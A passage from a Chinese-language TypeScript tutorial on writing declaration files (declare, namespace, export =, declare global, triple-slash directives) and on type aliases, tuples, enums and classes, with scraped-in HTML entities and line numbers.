类型，禁止修改这个全局变量jQuery = function(selector) &#123; return document.querySelector(selector);&#125;;// ERROR: Cannot assign to 'jQuery' because it is a constant or a read-only property. 一般来说，全局变量都是禁止修改的常量，所以大部分情况都应该使用 const 而不是 var 或 let。 需要注意的是，声明语句中只能定义类型，切勿在声明语句中定义具体的实现： 1234declare const jQuery = function(selector) &#123; return document.querySelector(selector);&#125;;// ERROR: An implementation cannot be declared in ambient contexts. declare functiondeclare function 用来定义全局函数的类型。jQuery 其实就是一个函数，所以也可以用 function 来定义： 12345// src/jQuery.d.tsdeclare function jQuery(selector: string): any;// src/index.tsjQuery('#foo'); 在函数类型的声明语句中，函数重载也是支持的： 123456789// src/jQuery.d.tsdeclare function jQuery(selector: string): any;declare function jQuery(domReadyCallback: () =&gt; any): any;// src/index.tsjQuery('#foo');jQuery(function() &#123; alert('Dom Ready!');&#125;); declare class当全局变量是一个类的时候，我们用 declare class 来定义它的类型： 123456789// src/Animal.d.tsdeclare class Animal &#123; name: string; constructor(name: string); sayHi(): string;&#125;// src/index.tslet cat = new Animal('Tom'); 同样的，declare class 语句也只能用来定义类型，不能用来定义具体的实现，比如定义 sayHi 方法的具体实现则会报错： 123456789// src/Animal.d.tsdeclare class Animal &#123; name: string; constructor(name: string); sayHi() &#123; return `My name is $&#123;this.name&#125;`; &#125;; // ERROR: An implementation cannot be declared in ambient contexts.&#125; declare enum使用 declare enum 定义的枚举类型也称作外部枚举（Ambient Enums），举例如下： 12345678910// src/Directions.d.tsdeclare enum Directions &#123; Up, Down, Left, Right&#125;// src/index.tslet directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 与其他全局变量的类型声明一致，declare enum 仅用来定义类型，而不是具体的值。 Directions.d.ts 仅仅会用于编译时的检查，声明文件里的内容在编译结果中会被删除。它编译结果是： directions 12345678910111213141516171819202122其中 Directions 是由第三方库定义好的全局变量。##### declare namespacenamespace 是 ts 早期时为了解决模块化而创造的关键字，中文称为命名空间。由于历史遗留原因，在早期还没有 ES6 的时候，ts 提供了一种模块化方案，使用 module 关键字表示内部模块。但由于后来 ES6 也使用了 module 关键字，ts 为了兼容 ES6，使用 namespace 替代了自己的 module，更名为命名空间。随着 ES6 的广泛应用，**现在已经不建议再使用 ts 中的 namespace**，而**推荐使用 ES6 的模块化方案**了，故我们不再需要学习 namespace 的使用了。namespace 被淘汰了，但是在声明文件中，declare namespace 还是比较常用的，它用来表示全局变量是一个对象，包含很多子属性。比如 jQuery 是一个全局变量，它是一个对象，提供了一个 jQuery.ajax 方法可以调用，那么我们就应该使用 declare namespace jQuery 来声明这个拥有多个子属性的全局变量。&#96;&#96;&#96;javascript&#x2F;&#x2F; src&#x2F;jQuery.d.tsdeclare namespace jQuery &#123; function ajax(url: string, settings?: any): void;&#125;&#x2F;&#x2F; src&#x2F;index.tsjQuery.ajax(&#39;&#x2F;api&#x2F;get_something&#39;); 注意，在 declare namespace 内部，我们直接使用 function ajax 来声明函数，而不是使用 declare function ajax。类似的，也可以使用 const, class, enum 等语句： 1234567891011121314151617// src/jQuery.d.tsdeclare namespace jQuery &#123; function ajax(url: string, settings?: any): void; const version: number; class Event &#123; blur(eventType: EventType): void &#125; enum EventType &#123; CustomClick &#125;&#125;// src/index.tsjQuery.ajax('/api/get_something');console.log(jQuery.version);const e = new jQuery.Event();e.blur(jQuery.EventType.CustomClick); 嵌套的命名空间： 如果对象拥有深层的层级，则需要用嵌套的 namespace 来声明深层的属性的类型： 1234567891011121314151617// src/jQuery.d.tsdeclare namespace jQuery &#123; function ajax(url: string, settings?: any): void; namespace fn &#123; function extend(object: any): void; &#125;&#125;// src/index.tsjQuery.ajax('/api/get_something');jQuery.fn.extend(&#123; check: function() &#123; return this.each(function() &#123; this.checked = true; &#125;); &#125;&#125;); 假如 jQuery 下仅有 fn 这一个属性（没有 ajax 等其他属性或方法），则可以不需要嵌套 namespace11： 12345678910111213// src/jQuery.d.tsdeclare namespace jQuery.fn &#123; function extend(object: any): void;&#125;// src/index.tsjQuery.fn.extend(&#123; check: function() &#123; return this.each(function() &#123; this.checked = true; &#125;); &#125;&#125;); interface 和 type除了全局变量之外，可能有一些类型我们也希望能暴露出来。在类型声明文件中，我们可以直接使用 interface 或 type 来声明一个全局的接口或类型： 12345678910111213141516171819// src/jQuery.d.tsinterface AjaxSettings &#123; method?: 'GET' | 'POST' data?: any;&#125;declare namespace jQuery &#123; function ajax(url: string, settings?: AjaxSettings): void;&#125;//这样的话，在其他文件中也可以使用这个接口或类型了：// src/index.tslet settings: AjaxSettings = &#123; method: 'POST', data: &#123; name: 'foo' &#125;&#125;;jQuery.ajax('/api/post_something', settings); type 与 interface 类似，不再赘述。 防止命名冲突暴露在最外层的 interface 或 type 会作为全局类型作用于整个项目中，我们应该尽可能的减少全局变量或全局类型的数量。故最好将他们放到 namespace 下： 1234567891011121314151617181920&#x2F;&#x2F; src&#x2F;jQuery.d.tsdeclare namespace jQuery &#123; interface AjaxSettings &#123; method?: &#39;GET&#39; | &#39;POST&#39; data?: any; &#125; function ajax(url: string, settings?: AjaxSettings): void;&#125;注意，在使用这个 interface 的时候，也应该加上 jQuery 前缀：&#x2F;&#x2F; src&#x2F;index.tslet settings: jQuery.AjaxSettings &#x3D; &#123; method: &#39;POST&#39;, data: &#123; name: &#39;foo&#39; &#125;&#125;;jQuery.ajax(&#39;&#x2F;api&#x2F;post_something&#39;, settings); 声明合并假如 jQuery 既是一个函数，可以直接被调用 jQuery(‘#foo’)，又是一个对象，拥有子属性 jQuery.ajax()（事实确实如此），那么我们可以组合多个声明语句，它们会不冲突的合并起来： 123456789// src/jQuery.d.tsdeclare function jQuery(selector: string): any;declare namespace jQuery &#123; function ajax(url: string, settings?: any): void;&#125;// src/index.tsjQuery('#foo');jQuery.ajax('/api/get_something'); npm包一般我们通过 import foo from ‘foo’ 导入一个 npm 包，这是符合 ES6 模块规范的。 在我们尝试给一个 npm 包创建声明文件之前，需要先看看它的声明文件是否已经存在。一般来说，npm 包的声明文件可能存在于两个地方： 与该 npm 包绑定在一起。判断依据是 package.json 中有 types 字段，或者有一个 index.d.ts 声明文件。这种模式不需要额外安装其他包，是最为推荐的，所以以后我们自己创建 npm 包的时候，最好也将声明文件与 npm 包绑定在一起。发布到 @types里。我们只需要尝试安装一下对应的@types包就知道是否存在该声明文件，安装命令是npm install @types/foo --save-dev。这种模式一般是由于 npm 包的维护者没有提供声明文件，所以只能由其他人将声明文件发布到 @types 里了。假如以上两种方式都没有找到对应的声明文件，那么我们就需要自己为它写声明文件了。由于是通过 import 语句导入的模块，所以声明文件存放的位置也有所约束，一般有两种方案： 创建一个 node_modules/@types/foo/index.d.ts文件，存放 foo 模块的声明文件。这种方式不需要额外的配置，但是 node_modules 目录不稳定，代码也没有被保存到仓库中，无法回溯版本，有不小心被删除的风险，故不太建议用这种方案，一般只用作临时测试。创建一个 types 目录，专门用来管理自己写的声明文件，将 foo 的声明文件放到 types/foo/index.d.ts中。这种方式需要配置下 tsconfig.json 中的 paths 和 baseUrl 字段。目录结构： tsconfig.json 内容： 123456789&#123; \"compilerOptions\": &#123; \"module\": \"commonjs\", \"baseUrl\": \"./\", \"paths\": &#123; \"*\": [\"types/*\"] &#125; &#125;&#125; 如此配置之后，通过 import 导入 foo 的时候，也会去 types 目录下寻找对应的模块的声明文件了。 注意 module 配置可以有很多种选项，不同的选项会影响模块的导入导出模式。这里我们使用了 commonjs 这个最常用的选项，后面的教程也都默认使用的这个选项。 不管采用了以上两种方式中的哪一种，我都强烈建议大家将书写好的声明文件（通过给第三方库发 pull request，或者直接提交到 @types 里）发布到开源社区中，享受了这么多社区的优秀的资源，就应该在力所能及的时候给出一些回馈。只有所有人都参与进来，才能让 ts 社区更加繁荣。 npm 包的声明文件主要有以下几种语法： export 导出变量 export namespace 导出（含有子属性的）对象 export default ES6 默认导出 export = commonjs 导出模块 exportnpm 包的声明文件与全局变量的声明文件有很大区别。在 npm 包的声明文件中，使用 declare 不再会声明一个全局变量，而只会在当前文件中声明一个局部变量。只有在声明文件中使用 export 导出，然后在使用方 import 导入后，才会应用到这些类型声明。 export 的语法与普通的 ts 中的语法类似，区别仅在于声明文件中禁止定义具体的实现： 123456789101112131415161718192021222324252627282930// types/foo/index.d.tsexport const name: string;export function getName(): string;export class Animal &#123; constructor(name: string); sayHi(): string;&#125;export enum Directions &#123; Up, Down, Left, Right&#125;export interface Options &#123; data: any;&#125;//对应的导入和使用模块应该是这样：// src/index.tsimport &#123; name, getName, Animal, Directions, Options &#125; from 'foo';console.log(name);let myName = getName();let cat = new Animal('Tom');let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right];let options: Options = &#123; data: &#123; name: 'foo' &#125;&#125;; 混用 declare 和 export我们也可以使用 declare 先声明多个变量，最后再用 export 一次性导出。上例的声明文件可以等价的改写为16： 123456789101112131415161718// types/foo/index.d.tsdeclare const name: string;declare function getName(): string;declare class Animal &#123; constructor(name: string); sayHi(): string;&#125;declare enum Directions &#123; Up, Down, Left, Right&#125;interface Options &#123; data: any;&#125;export &#123; name, getName, Animal, Directions, Options &#125;;//注意，与全局变量的声明文件类似，interface 前是不需要 declare 的。 export namespace与 declare namespace 类似，export namespace 用来导出一个拥有子属性的对象： 123456789101112// types/foo/index.d.tsexport namespace foo &#123; const name: string; namespace bar &#123; function baz(): string; &#125;&#125;// src/index.tsimport &#123; foo &#125; from 'foo';console.log(foo.name);foo.bar.baz(); export default在 ES6 模块系统中，使用 export default 可以导出一个默认值，使用方可以用 import foo from ‘foo’ 而不是 import { foo } from ‘foo’ 来导入这个默认值。 在类型声明文件中，export default 用来导出默认值的类型18： 123456// types/foo/index.d.tsexport default function foo(): string;// src/index.tsimport foo from 'foo';foo(); 注意，只有 function、class 和 interface 可以直接默认导出，其他的变量需要先定义出来，再默认导出 12345678// types/foo/index.d.tsexport default enum Directions &#123;// ERROR: Expression expected. Up, Down, Left, Right&#125; 上例中 export default enum 是错误的语法，需要使用 declare enum 定义出来，然后使用 export default 导出： 12345678// types/foo/index.d.tsdeclare enum Directions &#123; Up, Down, Left, Right&#125;export default Directions; 针对这种默认导出，我们一般会将导出语句放在整个声明文件的最前面： 12345678// types/foo/index.d.tsexport default Directions;declare enum Directions &#123; Up, Down, Left, Right&#125; export =在 commonjs 规范中，我们用以下方式来导出一个模块： 1234// 整体导出module.exports = foo;// 单个导出exports.bar = bar; 在 ts 中，针对这种模块导出，有多种方式可以导入，第一种方式是 const … = require： 1234// 整体导入const foo = require('foo');// 单个导入const bar = require('foo').bar; 第二种方式是 import … from，注意针对整体导出，需要使用 import * as 来导入： 1234// 整体导入import * as foo from 'foo';// 单个导入import &#123; bar &#125; from 'foo 第三种方式是 import … require，这也是 ts 官方推荐的方式： 1234// 整体导入import foo = require('foo');// 单个导入import bar = foo.bar; 对于这种使用 commonjs 规范的库，假如要为它写类型声明文件的话，就需要使用到 export = 这种语法了： 123456// types/foo/index.d.tsexport = foo;declare function foo(): string;declare namespace foo &#123; const bar: number;&#125; 需要注意的是，上例中使用了 export = 之后，就不能再单个导出 export { bar } 了。所以我们通过声明合并，使用 declare namespace foo 来将 bar 合并到 foo 里。 准确地讲，export = 不仅可以用在声明文件中，也可以用在普通的 ts 文件中。实际上，import … require 和 export = 都是 ts 为了兼容 AMD 规范和 commonjs 规范而创立的新语法，由于并不常用也不推荐使用，所以这里就不详细介绍了，感兴趣的可以看官方文档。 由于很多第三方库是 commonjs 规范的，所以声明文件也就不得不用到 export = 这种语法了。但是还是需要再强调下，相比与 export =，我们更推荐使用 ES6 标准的 export default 和 export。 UMD库既可以通过&lt;script&gt;标签引入，又可以通过 import 导入的库，称为 UMD 库。相比于 npm 包的类型声明文件，我们需要额外声明一个全局变量，为了实现这种方式，ts 提供了一个新语法 export as namespace。 export as namespace一般使用 export as namespace 时，都是先有了 npm 包的声明文件，再基于它添加一条 export as namespace 语句，即可将声明好的一个变量声明为全局变量，举例如下22： 12345678// types/foo/index.d.tsexport as namespace foo;export = foo;declare function foo(): string;declare namespace foo &#123; const bar: number;&#125; 当然它也可以与 export default 一起使用： 123456789// types/foo/index.d.tsexport as namespace foo;export default foo;declare function foo(): string;declare namespace foo &#123; const bar: number;&#125; 直接扩展全局变量有的第三方库扩展了一个全局变量，可是此全局变量的类型却没有相应的更新过来，就会导致 ts 编译错误，此时就需要扩展全局变量的类型。比如扩展 String 类型： 12345interface String &#123; prependHello(): string;&#125;'foo'.prependHello(); 通过声明合并，使用 interface String 即可给 String 添加属性或方法。 也可以使用 declare namespace 给已有的命名空间添加类型声明： 12345678910111213141516// types/jquery-plugin/index.d.tsdeclare namespace JQuery &#123; interface CustomOptions &#123; bar: string; &#125;&#125;interface JQueryStatic &#123; foo(options: JQuery.CustomOptions): string;&#125;// src/index.tsjQuery.foo(&#123; bar: ''&#125;); 在NPM库或UMD库中扩展全局变量如之前所说，对于一个 npm 包或者 UMD 库的声明文件，只有 export 导出的类型声明才能被导入。所以对于 npm 包或 UMD 库，如果导入此库之后会扩展全局变量，则需要使用另一种语法在声明文件中扩展全局变量的类型，那就是 declare global。 declare global使用 declare global 可以在 npm 包或者 UMD 库的声明文件中扩展全局变量的类型： 123456789101112// types/foo/index.d.tsdeclare global &#123; interface String &#123; prependHello(): string; &#125;&#125;export &#123;&#125;;// src/index.ts'bar'.prependHello(); 注意即使此声明文件不需要导出任何东西，仍然需要导出一个空对象，用来告诉编译器这是一个模块的声明文件，而不是一个全局变量的声明文件。 模块插件有时通过 import 导入一个模块插件，可以改变另一个原有模块的结构。此时如果原有模块已经有了类型声明文件，而插件模块没有类型声明文件，就会导致类型不完整，缺少插件部分的类型。ts 提供了一个语法 declare module，它可以用来扩展原有模块的类型。 declare module如果是需要扩展原有模块的话，需要在类型声明文件中先引用原有模块，再使用 declare module 扩展原有模块： 123456789101112// types/moment-plugin/index.d.tsimport * as moment from 'moment';declare module 'moment' &#123; export function foo(): moment.CalendarKey;&#125;// src/index.tsimport * as moment from 'moment';import 'moment-plugin';moment.foo(); declare module 也可用于在一个文件中一次性声明多个模块的类型： 123456789101112131415161718// types/foo-bar.d.tsdeclare module 'foo' &#123; export interface Foo &#123; foo: string; &#125;&#125;declare module 'bar' &#123; export function bar(): string;&#125;// src/index.tsimport &#123; Foo &#125; from 'foo';import * as bar from 'bar';let f: Foo;bar.bar(); 声明文件中的依赖一个声明文件有时会依赖另一个声明文件中的类型，比如在前面的 declare module 的例子中，我们就在声明文件中导入了 moment，并且使用了 moment.CalendarKey 这个类型： 1234567// types/moment-plugin/index.d.tsimport * as moment from 'moment';declare module 'moment' &#123; export function foo(): moment.CalendarKey;&#125; 除了可以在声明文件中通过 import 导入另一个声明文件中的类型之外，还有一个语法也可以用来导入另一个声明文件，那就是三斜线指令。 三斜线指令与 namespace 类似，三斜线指令也是 ts 在早期版本中为了描述模块之间的依赖关系而创造的语法。随着 ES6 的广泛应用，现在已经不建议再使用 ts 中的三斜线指令来声明模块之间的依赖关系了。 但是在声明文件中，它还是有一定的用武之地。 类似于声明文件中的 import，它可以用来导入另一个声明文件。与 import 的区别是，当且仅当在以下几个场景下，我们才需要使用三斜线指令替代 import： 当我们在书写一个全局变量的声明文件时 当我们需要依赖一个全局变量的声明文件时 书写一个全局变量的声明文件 这些场景听上去很拗口，但实际上很好理解——在全局变量的声明文件中，是不允许出现 import, export 关键字的。一旦出现了，那么他就会被视为一个 npm 包或 UMD 库，就不再是全局变量的声明文件了。故当我们在书写一个全局变量的声明文件时，如果需要引用另一个库的类型，那么就必须用三斜线指令了： 12345678// types/jquery-plugin/index.d.ts/// &lt;reference types=\"jquery\" /&gt;declare function foo(options: JQuery.AjaxSettings): string;// src/index.tsfoo(&#123;&#125;); 三斜线指令的语法如上，///后面使用 xml 的格式添加了对 jquery 类型的依赖，这样就可以在声明文件中使用 JQuery.AjaxSettings 类型了。 注意，三斜线指令必须放在文件的最顶端，三斜线指令的前面只允许出现单行或多行注释。 依赖一个全局变量的声明文件在另一个场景下，当我们需要依赖一个全局变量的声明文件时，由于全局变量不支持通过 import 导入，当然也就必须使用三斜线指令来引入了： 12345678910// types/node-plugin/index.d.ts/// &lt;reference types=\"node\" /&gt;export function foo(p: NodeJS.Process): string;// src/index.tsimport &#123; foo &#125; from 'node-plugin';foo(global.process); 在上面的例子中，我们通过三斜线指引入了 node 的类型，然后在声明文件中使用了 NodeJS.Process 这个类型。最后在使用到 foo 的时候，传入了 node 中的全局变量 process。 由于引入的 node 中的类型都是全局变量的类型，它们是没有办法通过 import 来导入的，所以这种场景下也只能通过三斜线指令来引入了。 以上两种使用场景下，都是由于需要书写或需要依赖全局变量的声明文件，所以必须使用三斜线指令。在其他的一些不是必要使用三斜线指令的情况下，就都需要使用 import 来导入。 拆分声明文件当我们的全局变量的声明文件太大时，可以通过拆分为多个文件，然后在一个入口文件中将它们一一引入，来提高代码的可维护性。比如 jQuery 的声明文件就是这样的： 123456789// node_modules/@types/jquery/index.d.ts/// &lt;reference types=\"sizzle\" /&gt;/// &lt;reference path=\"JQueryStatic.d.ts\" /&gt;/// &lt;reference path=\"JQuery.d.ts\" /&gt;/// &lt;reference path=\"misc.d.ts\" /&gt;/// &lt;reference path=\"legacy.d.ts\" /&gt;export = jQuery; 其中用到了 types 和 path 两种不同的指令。它们的区别是：types 用于声明对另一个库的依赖，而 path 用于声明对另一个文件的依赖。 上例中，sizzle 是与 jquery 平行的另一个库，所以需要使用 types=”sizzle” 来声明对它的依赖。而其他的三斜线指令就是将 jquery 的声明拆分到不同的文件中了，然后在这个入口文件中使用 path=”foo” 将它们一一引入。 其他三斜线指令除了这两种三斜线指令之外，还有其他的三斜线指令，比如/// &lt;reference no-default-lib=&quot;true&quot;/&gt;, /// &lt;amd-module /&gt;等，但它们都是废弃的语法，故这里就不介绍了。 自动生成声明文件如果库的源码本身就是由 ts 写的，那么在使用 tsc 脚本将 ts 编译为 js 的时候，添加 declaration 选项，就可以同时也生成 .d.ts 声明文件了。 我们可以在命令行中添加 –declaration（简写 -d），或者在 tsconfig.json 中添加 declaration 选项。这里以 tsconfig.json 为例： 1234567&#123; \"compilerOptions\": &#123; \"module\": \"commonjs\", \"outDir\": \"lib\", \"declaration\": true, &#125;&#125; 上例中我们添加了 outDir 选项，将 ts 文件的编译结果输出到 lib 目录下，然后添加了 declaration 选项，设置为 true，表示将会由 ts 文件自动生成 .d.ts 声明文件，也会输出到 lib 目录下。 运行 tsc 之后，目录结构如下：在这个例子中，src 目录下有两个 ts 文件，分别是 src/index.ts 和 src/bar/index.ts，它们被编译到 lib 目录下的同时，也会生成对应的两个声明文件 lib/index.d.ts 和 lib/bar/index.d.ts。它们的内容分别是： 1234567891011121314151617// src/index.tsexport * from './bar';export default function foo() &#123; return 'foo';&#125;// src/bar/index.tsexport function bar() &#123; return 'bar';&#125;// lib/index.d.tsexport * from './bar';export default function foo(): string;// lib/bar/index.d.tsexport declare function bar(): string; 可见，自动生成的声明文件基本保持了源码的结构，而将具体实现去掉了，生成了对应的类型声明。 使用 tsc 自动生成声明文件时，每个 ts 文件都会对应一个 .d.ts 声明文件。这样的好处是，使用方不仅可以在使用 import foo from ‘foo’ 导入默认的模块时获得类型提示，还可以在使用 import bar from ‘foo/lib/bar’ 导入一个子模块时，也获得对应的类型提示。 除了 declaration 选项之外，还有几个选项也与自动生成声明文件有关，这里只简单列举出来，不做详细演示了： declarationDir 设置生成 .d.ts 文件的目录 declarationMap 对每个 .d.ts 文件，都生成对应的 .d.ts.map（sourcemap）文件 emitDeclarationOnly 仅生成 .d.ts 文件，不生成 .js 文件 进阶类型别名类型别名用来给一个类型起个新名字。 简单的例子 12345678910type Name = string;type NameResolver = () =&gt; string;type NameOrResolver = Name | NameResolver;function getName(n: NameOrResolver): Name &#123; if (typeof n === 'string') &#123; return n; &#125; else &#123; return n(); &#125;&#125; 上例中，我们使用 type 创建类型别名。 类型别名常用于联合类型。 字符串字面量类型字符串字面量类型用来约束取值只能是某几个字符串中的一个。 简单的例子 123456789type EventNames = 'click' | 'scroll' | 'mousemove';function handleEvent(ele: Element, event: EventNames) &#123; // do something&#125;handleEvent(document.getElementById('hello'), 'scroll'); // 没问题handleEvent(document.getElementById('world'), 'dblclick'); // 报错，event 不能为 'dblclick'// index.ts(7,47): error TS2345: Argument of type '\"dblclick\"' is not assignable to parameter of type 'EventNames'. 上例中，我们使用 type 定了一个字符串字面量类型 EventNames，它只能取三种字符串中的一种。 注意，类型别名与字符串字面量类型都是使用 type 进行定义 元组数组合并了相同类型的对象，而元组（Tuple）合并了不同类型的对象。 元组起源于函数编程语言（如 F#），这些语言中会频繁使用元组。 简单的例子：定义一对值分别为 string 和 number 的元组： 1let tom: [string, number] = ['Tom', 25]; 当赋值或访问一个已知索引的元素时，会得到正确的类型： 123456let tom: [string, number];tom[0] = 'Tom';tom[1] = 25;tom[0].slice(1);tom[1].toFixed(2); 也可以只赋值其中一项： 12let tom: [string, number];tom[0] = 'Tom'; 但是当直接对元组类型的变量进行初始化或者赋值的时候，需要提供所有元组类型中指定的项。 123456let tom: [string, number];tom = ['Tom', 25];let tom: [string, number];tom = ['Tom'];// Property '1' is missing in type '[string]' but required in type '[string, number]'. 越界的元素：当添加越界的元素时，它的类型会被限制为元组中每个类型的联合类型： 123456let tom: [string, number];tom = ['Tom', 25];tom.push('male');tom.push(true);// Argument of type 'true' is not assignable to parameter of type 'string | number'. 枚举枚举（Enum）类型用于取值被限定在一定范围内的场景，比如一周只能有七天，颜色限定为红绿蓝等。 简单的例子:枚举使用 enum 关键字来定义： 1enum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;; 枚举成员会被赋值为从 0 开始递增的数字，同时也会对枚举值到枚举名进行反向映射： 1234567891011enum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[\"Sun\"] === 0); // trueconsole.log(Days[\"Mon\"] === 1); // trueconsole.log(Days[\"Tue\"] === 2); // trueconsole.log(Days[\"Sat\"] === 6); // trueconsole.log(Days[0] === \"Sun\"); // trueconsole.log(Days[1] === \"Mon\"); // trueconsole.log(Days[2] === \"Tue\"); // trueconsole.log(Days[6] === \"Sat\"); // true 事实上，上面的例子会被编译为： 12345678910var Days;(function (Days) &#123; Days[Days[\"Sun\"] = 0] = \"Sun\"; Days[Days[\"Mon\"] = 1] = \"Mon\"; Days[Days[\"Tue\"] = 2] = \"Tue\"; Days[Days[\"Wed\"] = 3] = \"Wed\"; Days[Days[\"Thu\"] = 4] = \"Thu\"; Days[Days[\"Fri\"] = 5] = \"Fri\"; Days[Days[\"Sat\"] = 6] = \"Sat\";&#125;)(Days || (Days = &#123;&#125;)); 我们也可以给枚举项手动赋值： 123456enum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[\"Sun\"] === 7); // trueconsole.log(Days[\"Mon\"] === 1); // trueconsole.log(Days[\"Tue\"] === 2); // trueconsole.log(Days[\"Sat\"] === 6); // true 上面的例子中，未手动赋值的枚举项会接着上一个枚举项递增。 如果未手动赋值的枚举项与手动赋值的重复了，TypeScript 是不会察觉到这一点的： 123456enum Days &#123;Sun = 3, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[\"Sun\"] === 3); // trueconsole.log(Days[\"Wed\"] === 3); // trueconsole.log(Days[3] === \"Sun\"); // falseconsole.log(Days[3] === \"Wed\"); // true 上面的例子中，递增到 3 的时候与前面的 Sun 的取值重复了，但是 TypeScript 并没有报错，导致 Days[3] 的值先是 “Sun”，而后又被 “Wed” 覆盖了。编译的结果是： 12345678910var Days;(function (Days) &#123; Days[Days[\"Sun\"] = 3] = \"Sun\"; Days[Days[\"Mon\"] = 1] = \"Mon\"; Days[Days[\"Tue\"] = 2] = \"Tue\"; Days[Days[\"Wed\"] = 3] = \"Wed\"; Days[Days[\"Thu\"] = 4] = \"Thu\"; Days[Days[\"Fri\"] = 5] = \"Fri\"; Days[Days[\"Sat\"] = 6] = \"Sat\";&#125;)(Days || (Days = &#123;&#125;)); 所以使用的时候需要注意，最好不要出现这种覆盖的情况。 手动赋值的枚举项可以不是数字，此时需要使用类型断言来让 tsc 无视类型检查 (编译出的 js 仍然是可用的)： 1234567891011enum Days &#123;Sun = 7, Mon, Tue, Wed, Thu, Fri, Sat = &lt;any&gt;\"S\"&#125;;var Days;(function (Days) &#123; Days[Days[\"Sun\"] = 7] = \"Sun\"; Days[Days[\"Mon\"] = 8] = \"Mon\"; Days[Days[\"Tue\"] = 9] = \"Tue\"; Days[Days[\"Wed\"] = 10] = \"Wed\"; Days[Days[\"Thu\"] = 11] = \"Thu\"; Days[Days[\"Fri\"] = 12] = \"Fri\"; Days[Days[\"Sat\"] = \"S\"] = \"Sat\";&#125;)(Days || (Days = &#123;&#125;)); 当然，手动赋值的枚举项也可以为小数或负数，此时后续未手动赋值的项的递增步长仍为 1： 123456enum Days &#123;Sun = 7, Mon = 1.5, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[\"Sun\"] === 7); // trueconsole.log(Days[\"Mon\"] === 1.5); // trueconsole.log(Days[\"Tue\"] === 2.5); // trueconsole.log(Days[\"Sat\"] === 6.5); // true 常数项和计算所得项枚举项有两种类型：常数项（constant member）和计算所得项（computed member）。 前面我们所举的例子都是常数项，一个典型的计算所得项的例子： 1enum Color &#123;Red, Green, Blue = \"blue\".length&#125;; 上面的例子中，”blue”.length 就是一个计算所得项。 上面的例子不会报错，但是如果紧接在计算所得项后面的是未手动赋值的项，那么它就会因为无法获得初始值而报错： 1234enum Color &#123;Red = \"red\".length, Green, Blue&#125;;// index.ts(1,33): error TS1061: Enum member must have initializer.// index.ts(1,40): error TS1061: Enum member must have initializer. 下面是常数项和计算所得项的完整定义： 当满足以下条件时，枚举成员被当作是常数： 不具有初始化函数并且之前的枚举成员是常数。在这种情况下，当前枚举成员的值为上一个枚举成员的值加 1。但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 0。 枚举成员使用常数枚举表达式初始化。常数枚举表达式是 TypeScript 表达式的子集，它可以在编译阶段求值。当一个表达式满足下面条件之一时，它就是一个常数枚举表达式： 数字字面量 引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的）如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用 带括号的常数枚举表达式 +, -, ~一元运算符应用于常数枚举表达式 +, -, *, /, %, &lt;&lt;, &gt;&gt;, &gt;&gt;&gt;, &amp;, |, ^二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 NaN 或 Infinity，则会在编译阶段报错 所有其它情况的枚举成员被当作是需要计算得出的值。 常数枚举常数枚举是使用 const enum 定义的枚举类型： 12345678const enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 常数枚举与普通枚举的区别是，它会在编译阶段被删除，并且不能包含计算成员。 上例的编译结果是： 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; 假如包含了计算成员，则会在编译阶段报错： 123const enum Color &#123;Red, Green, Blue = \"blue\".length&#125;;// index.ts(1,38): error TS2474: In 'const' enum declarations member initializer must be constant expression. 外部枚举外部枚举（Ambient Enums）是使用 declare enum 定义的枚举类型： 12345678declare enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 之前提到过，declare 定义的类型只会用于编译时的检查，编译结果中会被删除。 上例的编译结果是： 1var directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 外部枚举与声明语句一样，常出现在声明文件中。 同时使用 declare 和 const 也是可以的： 12345678declare const enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 编译结果： 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; TypeScript 的枚举类型的概念来源于 C#。 类传统方法中，JavaScript 通过构造函数实现类的概念，通过原型链实现继承。而在 ES6 中，我们终于迎来了 class。 TypeScript 除了实现了所有 ES6 中的类的功能以外，还添加了一些新的用法。 这一节主要介绍类的用法，下一节再介绍如何定义类的类型。 类的概念虽然 JavaScript 中有类的概念，但是可能大多数 JavaScript 程序员并不是非常熟悉类，这里对类相关的概念做一个简单的介绍。 类（Class）：定义了一件事物的抽象特点，包含它的属性和方法 对象（Object）：类的实例，通过 new 生成 面向对象（OOP）的三大特性：封装、继承、多态 封装（Encapsulation）：将对数据的操作细节隐藏起来，只暴露对外的接口。外界调用端不需要（也不可能）知道细节，就能通过对外提供的接口来访问该对象，同时也保证了外界无法任意更改对象内部的数据 继承（Inheritance）：子类继承父类，子类除了拥有父类的所有特性外，还有一些更具体的特性 多态（Polymorphism）：由继承而产生了相关的不同的类，对同一个方法可以有不同的响应。比如 Cat 和 Dog 都继承自 Animal，但是分别实现了自己的 eat 方法。此时针对某一个实例，我们无需了解它是 Cat 还是 Dog，就可以直接调用 eat 方法，程序会自动判断出来应该如何执行 eat 存取器（getter &amp; setter）：用以改变属性的读取和赋值行为 修饰符（Modifiers）：修饰符是一些关键字，用于限定成员或类型的性质。比如 public 表示公有属性或方法 抽象类（Abstract Class）：抽象类是供其他类继承的基类，抽象类不允许被实例化。抽象类中的抽象方法必须在子类中被实现 接口（Interfaces）：不同类之间公有的属性或方法，可以抽象成一个接口。接口可以被类实现（implements）。一个类只能继承自另一个类，但是可以实现多个接口 ES6 中类的用法下面我们先回顾一下 ES6 中类的用法。 属性和方法使用 class 定义类，使用 constructor 定义构造函数。 通过 new 生成新实例的时候，会自动调用构造函数。 123456789101112class Animal &#123; public name; constructor(name) &#123; this.name = name; &#125; sayHi() &#123; return `My name is $&#123;this.name&#125;`; 